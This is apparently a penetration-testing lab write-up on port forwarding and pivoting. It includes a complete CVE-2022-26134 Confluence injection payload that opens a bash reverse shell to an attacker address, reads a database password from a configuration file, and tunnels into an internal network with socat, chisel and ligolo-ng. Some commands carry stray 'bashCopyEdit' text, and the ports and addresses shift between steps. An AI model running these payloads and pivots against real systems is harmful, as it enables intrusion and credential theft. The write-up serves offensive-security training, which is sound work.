---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Port Foward

Port forwarding is a technique where a host listens on one port and relays traffic to another destination. It’s commonly used for:

* Allowing access to internal services from external networks.
* Home routers directing specific traffic (e.g. gaming, remote access).
* Attackers bypassing segmentation by routing traffic through a compromised host (pivot point).

## Linux

In this scenario:

* **Attacker (Kali)**: On the WAN.
* **Target Web Server (**`CONFLUENCE01`**)**: Exposed to the WAN and connected to a DMZ.
* **Internal Database (**`PGDATABASE01`**)**: In DMZ, not directly reachable from Kali.

> _A **Wide Area Network (WAN)** represents a large or public network, while a **Demilitarized Zone (DMZ)** acts as a buffer zone between a less trusted network and internal systems. Since Kali can’t directly access the DMZ, we'll need to leverage `CONFLUENCE01`’s dual-network position to reach `PGDATABASE01`._

<figure><img src="../../.gitbook/assets/linux_port_forwarding_topology.png" alt=""><figcaption></figcaption></figure>

After exploiting a vulnerable Confluence instance (`CVE-2022-26134`) we gain a reverse shell on `CONFLUENCE01`. and enumerate its position on the network.

{% tabs %}
{% tab title="1. Payload" %}
{% code overflow="wrap" %}
```bash
# payload from Kali exploiting CONFLUENCE01
$ curl http://192.168.185.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.236/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```
{% endcode %}
{% endtab %}

{% tab title="2. RevShell" %}
{% code overflow="wrap" %}
```bash
# reverse shell on Kali
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
...
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```
{% endcode %}
{% endtab %}

{% tab title="3. Positional Awareness" %}
{% code overflow="wrap" %}
```bash
# network interfaces
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever

# routing information
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```
{% endcode %}
{% endtab %}

{% tab title="4. Exposed Credentials" %}
{% code overflow="wrap" %}
```bash
# configuration files
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml

...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
... 
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Socat

Socat is a powerful command-line utility for bidirectional data transfer between two data channels. In this case, we use it to forward TCP connections from one network interface on a compromised host to a service on a different network that’s otherwise unreachable.

{% hint style="success" %}
**Recap**

1. We obtained a reverse shell on `CONFLUENCE01` and we can execute commands as the limited `confluence` user.
2. We identified that it has:
   1. A **WAN interface** (`192.168.50.63`) that our Kali machine can reach
   2. A **DMZ interface** (`10.4.50.63`) that can reach `PGDATABASE01` at `10.4.50.215:5432`
3. `CONFLUENCE01` does not have (and we can't install) the tools needed (e.g. `psql`) to access the database server on `PGDATABASE01`.&#x20;
{% endhint %}

Since we can’t install new software on `CONFLUENCE01` and `PGDATABASE01` isn’t accessible directly from our Kali machine, we can leverage `socat` to create a **TCP port forward**.

* **Listen** on a chosen TCP port (e.g., `2345`) on `CONFLUENCE01`’s WAN-facing interface.
* **Forward** any connections received on this port to `10.4.50.215:5432` on the DMZ side.

> _On `CONFLUENCE01`, we'll start a verbose (`-ddd`) Socat process. It will listen on TCP port `2345` (`TCP-LISTEN:2345`), fork into a new subprocess when it receives a connection (`fork`) instead of dying after a single connection, then forward all traffic it receives to TCP port `5432` on `PGDATABASE01` (`TCP:10.4.50.215:5432`)._

{% code overflow="wrap" %}
```bash
# from CONFLUENCE01
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```
{% endcode %}

Once this forward is active:

1. From our Kali machine on the WAN, we connect to `192.168.50.63:2345`.
2. Socat relays this traffic internally from `CONFLUENCE01` to `10.4.50.215:5432`.
3. From our perspective, it’s as though the PostgreSQL service is directly accessible at `192.168.50.63:5433`.

```bash
# from Kali
$ psql -h 192.168.50.63 -p 2345 -U postgres
```

<figure><img src="../../.gitbook/assets/linux_port_forwarding_topology_socat.png" alt=""><figcaption></figcaption></figure>

After some more enumeration of the internal network, we'll find `PGDATABASE01` is also running an SSH server, so we can check for **password reuse**. We can kill the original Socat process listening on port `2345` and create a port forward on `CONFLUENCE01` that will allow us to SSH directly from our Kali machine to `PGDATABASE01`.

{% tabs %}
{% tab title="1. Port Foward Setup" %}
{% code overflow="wrap" %}
```bash
# from CONFLUENCE01
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```
{% endcode %}
{% endtab %}

{% tab title="2. Using the Port Forward" %}
```bash
# from Kali
$ ssh database_admin@192.168.50.63 -p2222
...
database_admin@pgdatabase01:~$
```
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/linux_port_forwarding_topology_socat_ssh.png" alt=""><figcaption></figcaption></figure>

In addition to classic utilities like `socat`, modern red teams and penetration testers often turn to newer tools built for better performance, stealth, and encryption. Two widely used tools in this category are `chisel` and `ligolo-ng`. Both simplify pivoting and port forwarding tasks, often in environments where direct connections are blocked by network segmentation or firewall rules. We’ll revisit our original scenario, substituting `socat` with these tools.

### Chisel

**Chisel** is a fast, cross-platform, single-binary tool for tunneling TCP/UDP over HTTP or WebSockets. It can perform normal and reverse port forwarding and is a lightweight choice for pivoting through segmented environments.

{% tabs %}
{% tab title="1. Binary Transfer" %}
{% code overflow="wrap" %}
```bash
# upload the chisel binary to CONFLUENCE01
$ nc -lvnp 4444
...
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty;pty.spawn("/bin/sh")'
$ cd /tmp
$ wget http://192.168.45.235/chisel -o chisel
$ chmod +x chisel
$ ls -l chisel
-rwxr-x--- 1 confluence confluence 14535 Apr 18 07:15 chisel
```
{% endcode %}
{% endtab %}

{% tab title="2. Chisel Server" %}
{% code overflow="wrap" %}
```bash
# start the Chisel server on Kali for reverse port forwarding
$ ./chisel server -p 8000 --reverse
2025/04/18 10:18:22 server: Reverse tunnelling enabled
2025/04/18 10:18:22 server: Fingerprint xRAO8aEIJ4Yd+Zm6pujfez/GSR0wCmGm/CN59cFrQ6w=
2025/04/18 10:18:22 server: Listening on http://0.0.0.0:8000
```
{% endcode %}
{% endtab %}

{% tab title="3. Chisel Client" %}
{% code overflow="wrap" %}
```bash
# on CONFLUENCE01, start the Chisel client
# R: reverse port forward, 2345: local port on Kali, 10.4.125.215:5432: internal PostgreSQL service
$ ./chisel client 192.168.45.235:8000 R:2345:10.4.125.215:5432
```
{% endcode %}
{% endtab %}

{% tab title="4. Connect" %}
```bash
# connect to PostgreSQL from Kali
$ psql -h 127.0.0.1 -p 2345 -U postgres
```
{% endtab %}
{% endtabs %}

> _Kali communicates to `127.0.0.1:2345`, which is tunneled over HTTP by Chisel through `CONFLUENCE01` to the internal PostgreSQL service._

#### Common Issues

1. **System architecture and binary mismatch**. Check if your binary matches system architecture:

{% code overflow="wrap" %}
```bash
$ file chisel
chisel: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=88c20c821c78ce72978e923ca64cc302b01c10a8, for GNU/Linux 3.2.0, stripped

$ uname -m
x86_64
```
{% endcode %}

2. **Directory with no execute permissions**. If a directory is mounted with `noexec`, binaries can’t run from there. Check mounts:

{% code overflow="wrap" %}
```bash
$ mount | grep noexec
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs 
...
```
{% endcode %}

3. **GLIBC compatibility issues**. If you see:&#x20;

{% code overflow="wrap" %}
```bash
$ ./chisel client 192.168.45.235:8000 R:2345:10.4.125.215:5432

./chisel: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.32' not found (required by ./chisel)
```
{% endcode %}

…it means the binary expects a newer GLIBC than what’s installed. Use a **statically linked version** of the binary. Statically linked executables bundle their own libraries and don't rely on system GLIBC. Avoid `.deb`, `.apk`, or `.rpm` packages — those require elevated privileges and install system-wide. Instead, grab the **raw, statically linked `.gz` binary**:

{% code overflow="wrap" %}
```bash
# download and prepare on Kali
$ wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
$ gunzip chisel_1.10.1_linux_amd64.gz
$ mv chisel_1.10.1_linux_amd64 chisel
$ chmod +x chisel
$ ls -la chisel
-rwxrwxrwx 1 x7331 x7331 9371800 Apr 18 10:29 chisel
# confirm it's static
$ ldd chisel
        not a dynamic executable
```
{% endcode %}

```bash
# upload on pivot host (CONFULENCE01)
$ wget http://192.168.45.235/chisel
...
chisel            100%[===================>]   8.94M  94.7KB/s    in 1m 44s
2025-04-18 07:44:31 (88.2 KB/s) - ‘chisel’ saved [9371800/9371800]
$ chmod +x chisel
$ ls -la chisel
-rwxr-x--- 1 confluence confluence 9371800 Apr 18 07:29 chisel
# start chisel client
$ ./chisel client 192.168.45.235:8000 R:2345:10.4.125.215:5432
./chisel client 192.168.45.235:8000 R:2345:10.4.125.215:5432
2025/04/18 07:48:34 client: Connecting to ws://192.168.45.235:8000
2025/04/18 07:48:35 client: Connected (Latency 62.843374ms)
```

```bash
# connect via forward port on Kali
$ psql -h 127.0.0.1 -p 2345 -U postgres
Password for user postgres: # D@t4basePassw0rd!
...

postgres=#
```

### 🔧 Ligolo-NG

**Ligolo-NG** is a modern, agent-based tunneling utility for secure pivoting through SOCKS proxies or port forwards. It’s designed for ease of deployment, encrypted communication, and interactive pivoting.

#### ✅ Setup Process:

**Step 1:** Upload the Ligolo agent binary to CONFLUENCE01.

```bash
bashCopyEditwget http://192.168.45.236/ligolo-agent
chmod +x ligolo-agent
```

**Step 2:** Start the Ligolo-NG listener on Kali.

```bash
bashCopyEdit./ligolo-ng_proxy -listen 0.0.0.0:5555
```

**Step 3:** Run the Ligolo-NG agent on CONFLUENCE01.

```bash
bashCopyEdit./ligolo-agent -connect 192.168.45.236:5555
```

**Step 4:** On Kali, list active sessions and interact.

```bash
bashCopyEditsession
```

**Step 5 (optional):** Start a SOCKS proxy.

```bash
bashCopyEditproxy socks --listen 127.0.0.1:1080
```

**Step 6:** Use proxychains to tunnel PostgreSQL or other tools.

```bash
bashCopyEditproxychains psql -h 10.4.50.215 -p 5432 -U postgres
```

**Result:**\
Tools on Kali route traffic through the encrypted Ligolo tunnel, pivoting through CONFLUENCE01 to reach the internal database or other DMZ services.

***

### 📊 Summary Comparison

| Tool          | Setup Complexity | Stealth | Encryption       | Port Forward | SOCKS Proxy | Notes                  |
| ------------- | ---------------- | ------- | ---------------- | ------------ | ----------- | ---------------------- |
| **Socat**     | Low              | Medium  | No               | ✔️           | ❌           | Classic and reliable   |
| **Chisel**    | Medium           | High    | Optional (HTTPS) | ✔️           | ❌           | HTTP/WebSocket tunnels |
| **Ligolo-NG** | Medium-High      | High    | ✔️               | ✔️           | ✔️          | Agent-based pivoting   |

***

### ✅ Conclusion

While `socat` remains a dependable choice for basic port forwarding, **Chisel** and **Ligolo-NG** offer more modern, stealthy, and flexible alternatives, particularly valuable in segmented or monitored environments. Each provides unique advantages — Chisel for lightweight HTTP-based tunnels, and Ligolo-NG for encrypted SOCKS and interactive pivoting.
